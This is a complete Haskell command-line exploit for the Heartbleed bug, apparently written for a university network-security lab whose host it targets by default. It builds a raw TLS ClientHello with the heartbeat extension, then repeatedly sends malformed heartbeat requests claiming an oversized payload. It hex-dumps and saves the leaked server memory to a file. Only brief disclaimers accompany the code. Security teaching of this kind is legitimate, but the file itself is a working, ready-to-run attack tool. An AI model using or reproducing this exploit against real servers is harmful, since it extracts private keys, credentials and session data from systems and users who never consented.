-- Executable to exploit certain servers (Those that allow TLS 1.0)
-- vulnerable to the HeartBleed bug.
-- This software is NOT intended to be used for malicious purposes
--
-- Entry function is the 'main' function.
module Main where

import           Control.Monad
import           Control.Monad.Trans.Class  (lift)
import           Data.ByteString            (ByteString)
import qualified Data.ByteString            as BBS
import qualified Data.ByteString.Builder    as BB
import qualified Data.ByteString.Char8      as BS
import qualified Data.ByteString.Lazy.Char8 as LBS
import qualified Data.Char                  as C8
import           Hexdump
import           Network.Simple.TCP
import           Options.Applicative        hiding (Success, (&))

-- Data structure to hold the options for the CLI.
data BleedingOptions = BleedingOptions
                       {host  :: String    -- ^ the host address to connect to
                       ,port  :: String    -- ^ the port to connect to
                       ,file  :: FilePath  -- ^ output file for the binary response
                       ,clear :: Bool      -- ^ clear the output of non printable characters?
                       }

-- Generator for the command line options parser
bleedingOptions :: Parser BleedingOptions
bleedingOptions = BleedingOptions
                  <$> strOption
                      ( long "host"
                     <> value "netsec-heartbleed.net.hrz.tu-darmstadt.de"
                     <> metavar "HOST_ADDRESS"
                     <> help "HOST address of the server. Default netsec-heartbleed.net.hrz.tu-darmstadt.de.")
                  <*> strOption
                      ( long "port"
                     <> value "1337"
                     <> metavar "PORT"
                     <> help "Port of the server to test. Default 1337" )
                  <*> strOption
                      ( long "file"
                     <> value "response.hex"
                     <> metavar "FILEPATH"
                     <> help "File to write binary response to. Default response.hex" )
                  <*> switch
                      ( long "clear"
                     <> help "Clear output of non printable characters" )

-- finalized function to extract the command line options and print instruction
-- text.
opts :: ParserInfo BleedingOptions
opts = info (helper <*> bleedingOptions)
      ( fullDesc
     <> progDesc "Exploit the heardbleed bug for HOST_ADDRESS:PORT.\
                 \Writes the binary dump to FILEPATH. Hex viewer more or less\
                 \required to read the file. This is in effect the pure memory\
                 \dump of the server.\
                 \  DO NOT DO ANY HARM TO OTHER PEOPLES SERVERS!")


-- Main function. WithSocketsDo in necessary for windows users.
-- Just calls the bleed function.
main :: IO ()
main = withSocketsDo bleed

-- Make the server bleed...
-- In short parse the command line options, connect to the server and
-- let the exploit function handle the connection.
bleed :: IO ()
bleed = do opt <- execParser opts  -- parse command line arguments
           putStrLn "Connecting ..."
           connect (host opt) (port opt) (exploit (file opt) (clear opt))

-- Exploits the HeartBleed bug by sending the TLS hello,
-- ignoring the server hello and exploiting the modified heartbeat message.
exploit :: FilePath -> Bool -> (Socket, SockAddr) -> IO ()
exploit f c (s, _) = do putStrLn "Sending client hello..."
                        -- send client hello
                        send s (clientHello tlsVer)
                        putStrLn "Waiting for server hello..."
                        -- ignore server hello, but report if the connection was
                        -- prematurely closed
                        err <- ignoreHello
                        case err of
                          Just e -> putStrLn e -- report error
                          _ -> do putStrLn "Received server hello, proceeding with HeartBleed"
                                  goBleed f    -- Let the server bleed!
  where tlsVer = '\x01' -- Use TLSv1.0, most servers should support that one...
        -- send the HeardBeat request and print the result as hexdump to stdout
        -- and write the binary data to the file the user specified.
        format = if c
                    then BS.filter C8.isPrint
                    else id
        goBleed :: FilePath -> IO ()
        goBleed f = do send s (heartBeat tlsVer)  -- send heardbeat request
                       pay <- recv s 65536        -- wait for the response
                       case pay of
                         Just payload -> do hexdump (format payload)         -- hexdump to stdout
                                            BS.appendFile f (format payload) -- append to file
                                            goBleed f                        -- send next heardbeat
                         Nothing -> return () -- on connection termination, exit
        -- Receive as much data as the server has to offer and discard it.
        -- If nothing is received the server has prematurely closed the connection
        ignoreHello :: IO (Maybe String)
        ignoreHello = do response <- recv s 1024
                         case response of
                           Just payload -> if BS.length payload < 1024
                                              then return Nothing
                                              else ignoreHello
                           Nothing -> return (Just "Connection closed before receiving a server hello")

-- Pretty print hex representation of binary data.
hexdump :: ByteString -> IO ()
hexdump = putStrLn . prettyHex

-- Create the heartbeat request for a given TLS version (0x01 to 0x03)
heartBeat :: Char -> ByteString
heartBeat tlsVer = BS.pack hbs
  where hbs = ['\x18',           -- Content Type (Heartbeat)
               '\x03', tlsVer,   -- TLS version
               '\x00', '\x03',   -- Length
               -- Payload
               '\x01',           -- Type (Request)
               '\x40', '\x00'    -- Payload length
               ]

-- Create the TLS client hello
clientHello :: Char -> ByteString
clientHello tlsVer = BS.pack cls
  where cls = ['\x16'                 -- Content type ('\x16' for handshake)
              ,'\x03', tlsVer         -- TLS Version
              ,'\x00', '\xdc'         -- Length
               -- Handshake header
              ,'\x01'                  -- Type ('\x01' for ClientHello)
              ,'\x00', '\x00', '\xd8'  -- Length
              ,'\x03', tlsVer          -- TLS Version
               -- Random (32 byte)
              ,'\x53', '\x43', '\x5b', '\x90', '\x9d', '\x9b', '\x72', '\x0b'
              ,'\xbc', '\x0c', '\xbc', '\x2b', '\x92', '\xa8', '\x48', '\x97'
              ,'\xcf', '\xbd', '\x39', '\x04', '\xcc', '\x16', '\x0a', '\x85'
              ,'\x03', '\x90', '\x9f', '\x77', '\x04', '\x33', '\xd4', '\xde'
              ,'\x00'                  -- Session ID length
              ,'\x00', '\x66'          -- Cipher suites length
               -- Cipher suites (51 suites)
              ,'\xc0', '\x14', '\xc0', '\x0a', '\xc0', '\x22', '\xc0', '\x21'
              ,'\x00', '\x39', '\x00', '\x38', '\x00', '\x88', '\x00', '\x87'
              ,'\xc0', '\x0f', '\xc0', '\x05', '\x00', '\x35', '\x00', '\x84'
              ,'\xc0', '\x12', '\xc0', '\x08', '\xc0', '\x1c', '\xc0', '\x1b'
              ,'\x00', '\x16', '\x00', '\x13', '\xc0', '\x0d', '\xc0', '\x03'
              ,'\x00', '\x0a', '\xc0', '\x13', '\xc0', '\x09', '\xc0', '\x1f'
              ,'\xc0', '\x1e', '\x00', '\x33', '\x00', '\x32', '\x00', '\x9a'
              ,'\x00', '\x99', '\x00', '\x45', '\x00', '\x44', '\xc0', '\x0e'
              ,'\xc0', '\x04', '\x00', '\x2f', '\x00', '\x96', '\x00', '\x41'
              ,'\xc0', '\x11', '\xc0', '\x07', '\xc0', '\x0c', '\xc0', '\x02'
              ,'\x00', '\x05', '\x00', '\x04', '\x00', '\x15', '\x00', '\x12'
              ,'\x00', '\x09', '\x00', '\x14', '\x00', '\x11', '\x00', '\x08'
              ,'\x00', '\x06', '\x00', '\x03', '\x00', '\xff'
              ,'\x01'                  -- Compression methods length
              ,'\x00'                  -- Compression method ('\x00' for NULL)
              ,'\x00', '\x49'          -- Extensions length
               -- Extension: ec_point_formats
              ,'\x00', '\x0b', '\x00', '\x04', '\x03', '\x00', '\x01', '\x02'
               -- Extension: elliptic_curves
              ,'\x00', '\x0a', '\x00', '\x34', '\x00', '\x32', '\x00', '\x0e'
              ,'\x00', '\x0d', '\x00', '\x19', '\x00', '\x0b', '\x00', '\x0c'
              ,'\x00', '\x18', '\x00', '\x09', '\x00', '\x0a', '\x00', '\x16'
              ,'\x00', '\x17', '\x00', '\x08', '\x00', '\x06', '\x00', '\x07'
              ,'\x00', '\x14', '\x00', '\x15', '\x00', '\x04', '\x00', '\x05'
              ,'\x00', '\x12', '\x00', '\x13', '\x00', '\x01', '\x00', '\x02'
              ,'\x00', '\x03', '\x00', '\x0f', '\x00', '\x10', '\x00', '\x11'
               -- Extension: SessionTicket TLS
              ,'\x00', '\x23', '\x00', '\x00'
               -- Extension: Heartbeat
              ,'\x00', '\x0f', '\x00', '\x01', '\x01']
